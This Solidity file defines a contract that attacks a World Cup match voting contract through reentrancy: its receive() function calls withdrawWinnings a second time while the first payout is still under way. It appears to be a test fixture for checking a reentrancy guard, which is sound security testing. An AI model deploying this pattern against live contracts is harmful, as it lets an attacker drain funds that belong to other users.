// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWorldCupMatchAttack {
    function vote(uint8 teamIndex, uint256 numVotes, address referrer) external payable;
    function withdrawWinnings() external;
}

contract ReentrancyAttacker {
    IWorldCupMatchAttack public matchTarget;
    bool public attacking;

    constructor(address _target) {
        matchTarget = IWorldCupMatchAttack(_target);
    }

    function attack_vote(uint8 teamIndex, uint256 numVotes, address referrer) external payable {
        matchTarget.vote{value: msg.value}(teamIndex, numVotes, referrer);
    }

    function attack_withdraw() external {
        attacking = true;
        matchTarget.withdrawWinnings();
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            matchTarget.withdrawWinnings();
        }
    }
}
